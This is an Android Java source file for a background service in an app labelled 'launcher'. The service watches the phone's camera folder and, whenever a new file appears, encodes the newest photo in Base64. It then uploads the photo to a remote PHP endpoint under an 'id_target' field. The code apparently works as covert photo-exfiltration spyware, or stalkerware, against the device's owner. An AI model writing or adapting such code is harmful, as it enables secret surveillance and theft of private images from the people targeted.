package com.example.marwa.launcher002.services;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Environment;
import android.os.FileObserver;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.MediaStore;
import android.support.annotation.Nullable;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.example.marwa.launcher002.MainActivity;
import com.example.marwa.launcher002.Singleton.MySingleton;
import com.example.marwa.launcher002.utils.WSadressIP;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;

import static android.content.ContentValues.TAG;

public class getPhotosService extends Service {
    private Timer timer = new Timer();
    public static FileObserver observer;

    @Override
    public IBinder onBind(Intent intent)
    {
        return null;
    }

    @Override
    public void onCreate()
    {
        super.onCreate();
        startWatching();
       /* timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                try {
                    getAllPhotos();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }, 0, 150000);*/
    }

    @Override
    public void onDestroy()
    {
        super.onDestroy();
    }


    //--------------------- Marwa: send all images in phone



    public void getAllPhotos() throws IOException {

        Cursor mCursor = getContentResolver()
                .query(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        null,
                        null,
                        null,
                        //MediaStore.Images.Media.DEFAULT_SORT_ORDER);
                        MediaStore.Images.ImageColumns.DATE_TAKEN + " DESC");

        if(mCursor!=null) {
           // if (mCursor.moveToFirst()){
              //  do {
            mCursor.moveToNext();
                    Log.d(TAG, " - _ID : " + mCursor.getString(mCursor.getColumnIndex(MediaStore.Images.Media._ID)));
                    Log.d(TAG, " - File Name : " + mCursor.getString(mCursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)));
                    Log.d(TAG, " - File Path : " + mCursor.getString(mCursor.getColumnIndex(MediaStore.Images.Media.DATA)));



                        SavePhotosDB(mCursor.getString(mCursor.getColumnIndex(MediaStore.Images.Media.DATA)),
                                mCursor.getString(mCursor.getColumnIndex(MediaStore.Images.Media.DATE_TAKEN)),
                                mCursor.getString(mCursor.getColumnIndex(MediaStore.Images.Media._ID))
                        );




              //  }while (mCursor.moveToNext());
           // }
            mCursor.close();
        }

    }

    public void  SavePhotosDB(String filePath, final String dateTaken, final String photoId) throws IOException {

        //final String encodedImage = Base64.encodeToString(filePath.getBytes(), Base64.DEFAULT);


        Bitmap bmp = Bitmap.createBitmap(MediaStore.Images.Media.getBitmap(getContentResolver(), Uri.fromFile(new File(filePath))));
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bmp.compress(Bitmap.CompressFormat.JPEG, 100, baos);
        byte[] imageBytes = baos.toByteArray();
        final String encodedImage = Base64.encodeToString(imageBytes, Base64.DEFAULT);



        //---------------
        final String URL = "http://"+ WSadressIP.WSIP+"/launcher/MAddPhoto.php";
        StringRequest stringRequest = new StringRequest(Request.Method.POST, URL, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                Log.d("******", "**********************gallery 1");
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                Toast.makeText(getApplicationContext(),"failed to add screenshot",Toast.LENGTH_SHORT).show();
                Log.d("******", "**********************gallery 2");
            }
        }){
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> params = new HashMap<>();
                params.put("Content-Type","application/x-www-form-urlencoded");

                Log.d("******", "**********************gallery 3");
                params.put("id_target",MainActivity.id_target);
                params.put("img_file",encodedImage);



                params.put("datee",dateTaken);
                params.put("photoId",photoId);
                return params;
            }
        };
        Log.d("mytag", "OK Photo added"); // THIS WORKS
        //adding our stringrequest to queue
        MySingleton.getInstance(getApplicationContext()).addToRequestQueue(stringRequest);
        Log.d("******", "**********************gallery 4");
    }


    private void startWatching() {

        //The desired path to watch or monitor
        //E.g Camera folder
        final String pathToWatch = android.os.Environment.getExternalStorageDirectory().toString() + "/DCIM/Camera/";


        observer = new FileObserver(pathToWatch, FileObserver.ALL_EVENTS) { // set up a file observer to watch this directory
            @Override
            public void onEvent(int event, final String file) {
               // if (event == FileObserver.CREATE || event == FileObserver.CLOSE_WRITE || event == FileObserver.MODIFY || event == FileObserver.MOVED_TO && !file.equals(".probe")) { // check that it's not equal to .probe because thats created every time camera is launched
                    Log.d("MediaListenerService", "File created [" + pathToWatch + file + "]");
                if (event == FileObserver.CREATE){
                    try {
                        getAllPhotos();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    try {
                        getAllPhotos();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                /*new Handler(Looper.getMainLooper()).post(new Runnable() {
                        @Override
                        public void run() {



                        }
                    });*/
                }
            }
        };
        observer.startWatching();
    }
}




